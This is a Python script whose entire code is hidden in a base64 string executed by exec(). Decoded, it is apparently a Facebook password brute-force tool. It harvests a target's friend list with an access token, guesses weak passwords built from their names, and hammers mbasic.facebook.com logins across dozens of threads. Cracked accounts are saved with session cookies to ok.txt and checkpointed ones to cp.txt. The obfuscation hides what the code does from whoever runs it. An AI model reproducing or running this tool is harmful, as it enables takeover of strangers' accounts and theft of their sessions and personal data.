# Source Code By Fahim  
# Don't Remove The Encrypt 
# Appreciate the Author, Thank You
import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zCiMtKi1jb2Rpbmc6dXRmLTgtKi0KIyBNYWRlIFdpdGgg4p2k77iPIEJ5IEZhaGltWEQKCmltcG9ydCByZXF1ZXN0cyxiczQsc3lzLG9zLHJhbmRvbSx0aW1lLHJlLGpzb24sY29uY3VycmVudAppbXBvcnQgYm90X2ZvbGxvd19zYmYKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sCgpvayA9IFtdCmNwID0gW10KdHRsID0gW10KYnVsYW5fdHRsID0geyIwMSI6ICJKYW51YXJ5IiwgIjAyIjogIkZlYnJ1YXJ5IiwgIjAzIjogIk1hcmNoIiwgIjA0IjogIkFwcmlsIiwgIjA1IjogIk1heSIsICIwNiI6ICJKdW5lIiwgIjA3IjogIkp1bHkiLCAiMDgiOiAiQXVndXN0IiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPY3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlY2VtYmVyIn0KCmRlZiBsb2dvKCk6CiAgICBwcmludCgnXG4gICBfX19fX19fICBfX19fICAgIF9fXyBcbiAgLyBfXy8gXyApLyBfXy9fX198XyAgfCDilIzilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilJBcbiBfXCBcLyBfICAvIF8vL19fXy8gX18vICDilIIgIOKAoiBDb2RlZCBCeSBGYWhpbVhEIOKAoiAg4pSCXG4vX19fL19fX18vXy8gICAgIC9fX19fLyAg4pSCIEdpdGh1Yi5jb20vRmFoaW0tWEQvc2Jm4pSCXG4gIFNpbXBsZSBCcnV0ZSBGb3JjZSAgICAg4pSU4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSYXG4nKQoKZGVmIGxvZ2luKCk6CiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKTtvcy5zeXN0ZW0oJ2NsZWFyJyk7bG9nbygpCiAgICB0b2tlbiA9IGlucHV0KCdb4oCiXSBFbnRlciBUb2tlbiA6XG5cbicpCiAgICB0cnk6eCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSIgKyB0b2tlbik7eSA9IGpzb24ubG9hZHMoeC50ZXh0KTtuID0geVsnbmFtZSddO3YgPSBvcGVuKCJ0b2tlbi50eHQiLCAidyIpO3Yud3JpdGUodG9rZW4pO3YuY2xvc2UoKTtleGl0KGJvdF9mb2xsb3dfc2JmLm1haW4oKSkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoJ1xuWyFdIFRva2VuIEludmFsaWQnKTtvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKTtsb2dpbigpCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6cHJpbnQoJ1xuWyFdIENvbm5lY3Rpb24gUHJvYmxlbScpO29zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpO2xvZ2luKCkKCmRlZiBtZW51KCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJyk7bG9nbygpCiAgICB0cnk6dG9rZW4gPSBvcGVuKCJ0b2tlbi50eHQiLCJyIikucmVhZCgpO3ggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pO3kgPSBqc29uLmxvYWRzKHgudGV4dCk7biA9IHlbJ25hbWUnXTtpID0geVsnaWQnXQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpwcmludCgnXG5bIV0gVG9rZW4gSW52YWxpZCcpO29zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpO2xvZ2luKCkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjpwcmludCgnXG5bIV0gQ29ubmVjdGlvbiBQcm9ibGVtJyk7b3Muc3lzdGVtKCdybSAtcmYgdG9rZW4udHh0Jyk7bG9naW4oKQogICAgcHJpbnQoJ1vigKJdIE5hbWUgOiAlcyclKG4pKTtwcmludCgnW+KAol0gSUQgOiAlcyclKGkpKTtjcmFja19wdWJsaWsoKQogICAgCmRlZiBjcmFja19wdWJsaWsoKToKICAgIHRyeTp0b2tlbiA9IG9wZW4oInRva2VuLnR4dCIsInIiKS5yZWFkKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoJ1xuWyFdIFRva2VuIEludmFsaWQnKTtvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKTtsb2dpbigpCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6cHJpbnQoJ1xuWyFdIENvbm5lY3Rpb24gUHJvYmxlbSAnKTtvcy5zeXN0ZW0oJ3JtIC1yZiB0b2tlbi50eHQnKTtsb2dpbigpCiAgICBwcmludCgnXG5b4oCiXSBUeXBlIFwnbWVcJyBUbyBEdW1wIEZyb20gRnJpZW5kcycpO2kgPSBpbnB1dCgiW+KAol0gSUQgUHVibGljIDogIikKICAgIHRyeToKICAgICAgICB0cnk6byA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGkgKyAiP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pO2IgPSBqc29uLmxvYWRzKG8udGV4dCk7cHJpbnQgKCdb4oCiXSBOYW1lIDogJXMnJShiWyduYW1lJ10pKQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoJ1xuWyFdIElEIE5vdCBmb3VuZCcpO21lbnUoKQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49JXMiJShpLHRva2VuKSk7aWQgPSBbXTt6ID0ganNvbi5sb2FkcyhyLnRleHQpO2wgPSAoYlsiZmlyc3RfbmFtZSJdKyIuanNvbiIpLnJlcGxhY2UoIiAiLCJfIik7ZCA9IG9wZW4obCwidyIpCiAgICAgICAgZm9yIGEgaW4gelsiZGF0YSJdOgogICAgICAgICAgICBpZC5hcHBlbmQoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0pO2Qud3JpdGUoYVsiaWQiXSsi4oCiIithWyJuYW1lIl0rIlxuIikKICAgICAgICBkLmNsb3NlKCk7cHJpbnQoJ1vigKJdIFRvdGFsIElEIDogJXMnJShsZW4oaWQpKSkKICAgICAgICByZXR1cm4gY3JhY2sobCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KCdcblshXSBFcnJvciA6ICVzJyUoZSkpCgpkZWYgcGFzc3dvcmQodGV4dCk6CiAgICByZXN1bHRzPVtdCiAgICBmb3IgaSBpbiB0ZXh0LnNwbGl0KCIgIik6CiAgICAgICAgaT1pLmxvd2VyKCkKICAgICAgICBpZiBsZW4oaSk+PTYgOiByZXN1bHRzLmFwcGVuZChpKTtyZXN1bHRzLmFwcGVuZChpKyIxMjMiKTtyZXN1bHRzLmFwcGVuZChpKyIxMjM0NSIpCiAgICAgICAgZWxpZiBsZW4oaSk9PTMgb3IgbGVuKGkpPT00IG9yIGxlbihpKT09NSA6IHJlc3VsdHMuYXBwZW5kKGkrIjEyMyIpO3Jlc3VsdHMuYXBwZW5kKGkrIjEyMzQ1IikKICAgICAgICBlbHNlOmNvbnRpbnVlCiAgICByZXN1bHRzLmFwcGVuZCh0ZXh0Lmxvd2VyKCkpCiAgICByZXR1cm4gcmVzdWx0cwoKZGVmIGxvZ2dlcihlbSxwYXMsaG9zdHMpOgogICAgdWEgPSByYW5kb20uY2hvaWNlKFsnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nXSk7ciA9IHJlcXVlc3RzLlNlc3Npb24oKTtyLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KTtwID0gci5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8iKTtiID0gYnM0LkJlYXV0aWZ1bFNvdXAocC50ZXh0LCJodG1sLnBhcnNlciIpO21ldGE9IiIuam9pbihiczQucmUuZmluZGFsbCgnZHRzZyI6XHsidG9rZW4iOiIoLio/KSInLHAudGV4dCkpO2RhdGE9e30KICAgIGZvciBpIGluIGIoImlucHV0Iik6CiAgICAgICAgaWYgaS5nZXQoInZhbHVlIikgaXMgTm9uZToKICAgICAgICAgICAgaWYgaS5nZXQoIm5hbWUiKT09ImVtYWlsIjpkYXRhLnVwZGF0ZSh7ImVtYWlsIjplbX0pCiAgICAgICAgICAgIGVsaWYgaS5nZXQoIm5hbWUiKT09InBhc3MiOmRhdGEudXBkYXRlKHsicGFzcyI6cGFzfSkKICAgICAgICAgICAgZWxzZTpkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKToiIn0pCiAgICAgICAgZWxzZTpkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pCiAgICBkYXRhLnVwZGF0ZSh7ImZiX2R0c2ciOm1ldGEsIm1fc2VzcyI6IiIsIl9fdXNlciI6IjAiLCJfX3JlcSI6ImQiLCJfX2NzciI6IiIsIl9fYSI6IiIsIl9fZHluIjoiIiwiZW5jcGFzcyI6IiJ9KTtyLmhlYWRlcnMudXBkYXRlKHsicmVmZXJlciI6Imh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgifSk7cG8gPSByLnBvc3QoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvbG9naW4vYXN5bmMvP3JlZnNyYz1odHRwcyUzQSUyRiUyRm0uZmFjZWJvb2suY29tJTJGbG9naW4lMkYlM0ZyZWYlM0RkYmwmbHd2PTEwMCIsZGF0YT1kYXRhKS50ZXh0CiAgICBpZiAiY191c2VyIiBpbiBsaXN0KHIuY29va2llcy5nZXRfZGljdCgpLmtleXMoKSk6cmV0dXJuIHsic3RhdHVzIjoic3VjY2VzcyIsImVtYWlsIjplbSwicGFzcyI6cGFzLCJjb29raWVzIjpyLmNvb2tpZXMuZ2V0X2RpY3QoKX0KICAgIGVsaWYgImNoZWNrcG9pbnQiIGluIGxpc3Qoci5jb29raWVzLmdldF9kaWN0KCkua2V5cygpKTpyZXR1cm4geyJzdGF0dXMiOiJjcCIsImVtYWlsIjplbSwicGFzcyI6cGFzLCJjb29raWVzIjpyLmNvb2tpZXMuZ2V0X2RpY3QoKX0KICAgIGVsc2U6cmV0dXJuIHsic3RhdHVzIjoiZXJyb3IiLCJlbWFpbCI6ZW0sInBhc3MiOnBhc30KCmRlZiBrb2tpKGNvb2tpZXMpOgogICAgcmVzdWx0PVtdCiAgICBmb3IgaSBpbiBlbnVtZXJhdGUoY29va2llcy5rZXlzKCkpOgogICAgICAgIGlmIGlbMF09PWxlbihjb29raWVzLmtleXMoKSktMTpyZXN1bHQuYXBwZW5kKGlbMV0rIj0iK2Nvb2tpZXNbaVsxXV0pCiAgICAgICAgZWxzZTpyZXN1bHQuYXBwZW5kKGlbMV0rIj0iK2Nvb2tpZXNbaVsxXV0rIjsgIikKICAgIHJldHVybiAiIi5qb2luKHJlc3VsdCkKCmNsYXNzIGNyYWNrOgogICAgZGVmIF9faW5pdF9fKHNlbGYsaXNpZmlsZSk6CiAgICAgICAgc2VsZi5hZGE9W107c2VsZi5jcD1bXTtzZWxmLmtvPTA7cHJpbnQoJ1xuW+KAol0gQ3JhY2sgV2l0aCBQYXNzd29yZCBEZWZhdWx0L01hbnVhbCBbZC9tXScpCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgZiA9IGlucHV0KCdb4oCiXSBjaG9vc2UgOiAnKQogICAgICAgICAgICBpZiBmIGluIFsnJ10gOiBjb250aW51ZQogICAgICAgICAgICBlbGlmIGYgaW4gWydtJywnTScsJzInLCcwMicsJzAwMiddOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpzZWxmLmFwayA9IGlzaWZpbGU7c2VsZi5mcyA9IG9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCk7YnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnByaW50KCJcblshXSBFcnJvciA6ICVzIiUoZSkpO2NvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mbD1bXQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpzZWxmLmZsLmFwcGVuZCh7ImlkIjppLnNwbGl0KCLigKIiKVswXX0pCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnByaW50KCJcblshXSBFcnJvciA6ICVzIiUoZSkpO2NvbnRpbnVlCiAgICAgICAgICAgICAgICBwcmludCgnW+KAol0gQ29udG9oIDogc2F5YW5nLGJpc21pbGxhaCwxMjM0NTYnKTtzZWxmLnB3bGlzdCgpO2JyZWFrCiAgICAgICAgICAgIGVsaWYgZiBpbiBbJ2QnLCdEJywnMScsJzAxJywnMDAxJ106CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OnNlbGYuYXBrPWlzaWZpbGU7c2VsZi5mcz1vcGVuKHNlbGYuYXBrKS5yZWFkKCkuc3BsaXRsaW5lcygpO2JyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludCgiXG5bIV0gRXJyb3IgOiAlcyIlKGUpKTtjb250aW51ZQogICAgICAgICAgICAgICAgICAgIHNlbGYuZmw9W10KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLmZzOgogICAgICAgICAgICAgICAgICAgICAgICB0cnk6c2VsZi5mbC5hcHBlbmQoeyJpZCI6aS5zcGxpdCgi4oCiIilbMF0sInB3IjpwYXNzd29yZChpLnNwbGl0KCLigKIiKVsxXSl9KQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6Y29udGludWUKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludCgiXG5bIV0gRXJyb3IgOiAlcyIlKGUpKQogICAgICAgICAgICAgICAgc3RhcnRlZCgpO1RocmVhZFBvb2woMzUpLm1hcChzZWxmLm1iYXNpYyxzZWxmLmZsKTtvcy5yZW1vdmUoc2VsZi5hcGspO2V4aXQoKQogICAgICAgICAgICBlbHNlOmNvbnRpbnVlCiAgICBkZWYgcHdsaXN0KHNlbGYpOgogICAgICAgIHNlbGYucHc9aW5wdXQoJ1vigKJdIE1hc3Vra2FuIFBhc3N3b3JkIDogJykuc3BsaXQoIiwiKQogICAgICAgIGlmIGxlbihzZWxmLnB3KSA9PTA6c2VsZi5wd2xpc3QoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZmw6aS51cGRhdGUoeyJwdyI6c2VsZi5wd30pCiAgICAgICAgICAgIHN0YXJ0ZWQoKTtUaHJlYWRQb29sKDMwKS5tYXAoc2VsZi5tYmFzaWMsc2VsZi5mbCk7b3MucmVtb3ZlKHNlbGYuYXBrKTtleGl0KCkKICAgIGRlZiBtYmFzaWMoc2VsZixmbCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgaSBpbiBmbC5nZXQoInB3Iik6CiAgICAgICAgICAgICAgICBsb2cgPSBsb2dnZXIoZmwuZ2V0KCJpZCIpLGksImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpCiAgICAgICAgICAgICAgICBpZiBsb2cuZ2V0KCJzdGF0dXMiKT09ImNwIjoKICAgICAgICAgICAgICAgICAgICB0cnk6a2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBmbC5nZXQoImlkIikgKyAiP2FjY2Vzc190b2tlbj0iICsgb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKSk7dHQgPSBqc29uLmxvYWRzKGtlLnRleHQpO3R0bCA9IHR0WyJiaXJ0aGRheSJdO20sZCx5ID0gdHRsLnNwbGl0KCIvIik7bSA9IGJ1bGFuX3R0bFttXTtwcmludCgiXHJbQ1BdICVzIOKAoiAlcyDigKIgJXMgJXMgJXMgICAiJShmbC5nZXQoImlkIiksaSxkLG0seSkpO3NlbGYuY3AuYXBwZW5kKCIlc+KAoiVz4oCiJXMlcyVzIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKTtvcGVuKCJjcC50eHQiLCJhKyIpLndyaXRlKCIlc+KAoiVz4oCiJXMlcyVzXG4iJShmbC5nZXQoImlkIiksaSxkLG0seSkpO2JyZWFrCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0KEtleUVycm9yLCBJT0Vycm9yKTptID0gIiAiO2QgPSAiICI7eSA9ICIgIgogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxyW0NQXSAlcyDigKIgJXMgICAgICAgICAgICAgICAiJShmbC5nZXQoImlkIiksaSkpO3NlbGYuY3AuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKTtvcGVuKCJjcC50eHQiLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShmbC5nZXQoImlkIiksaSkpO2JyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxvZy5nZXQoInN0YXR1cyIpPT0ic3VjY2VzcyI6cHJpbnQoIlxyW09LXSAlcyDigKIgJXMg4oCiICVzICAgICAgICAgICAgICAiJShmbC5nZXQoImlkIiksaSxrb2tpKGxvZy5nZXQoImNvb2tpZXMiKSkpKTtzZWxmLmFkYS5hcHBlbmQoIiVz4oCiJXMiJShmbC5nZXQoImlkIiksaSkpO29wZW4oIm9rLnR4dCIsImErIikud3JpdGUoIiVz4oCiJXNcbiIlKGZsLmdldCgiaWQiKSxpKSk7YnJlYWsKICAgICAgICAgICAgICAgIGVsc2U6Y29udGludWUKICAgICAgICAgICAgc2VsZi5rbys9MQogICAgICAgICAgICBwcmludCgiXHJbQ3JhY2tdWyVzLyVzXVtPSzolc11bQ1A6JXNdIiUoc2VsZi5rbyxsZW4oc2VsZi5mbCksbGVuKHNlbGYuYWRhKSxsZW4oc2VsZi5jcCkpLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHNlbGYubWJhc2ljKGZsKQoKZGVmIHN0YXJ0ZWQoKToKICAgIHByaW50KCdcblvigKJdIENyYWNrIE9uZ29pbmcuLi4nKTtwcmludCgnW+KAol0gQWNjb3VudCBbT0tdIFNhdmVkIFRvIG9rLnR4dCcpO3ByaW50KCdb4oCiXSBBY2NvdW50IFtDUF0gU2F2ZWQgVG8gY3AudHh0XG4nKQoKaWYgX19uYW1lX189PSdfX21haW5fXyc6b3Muc3lzdGVtKCdnaXQgcHVsbCcpO21lbnUoKQo="))
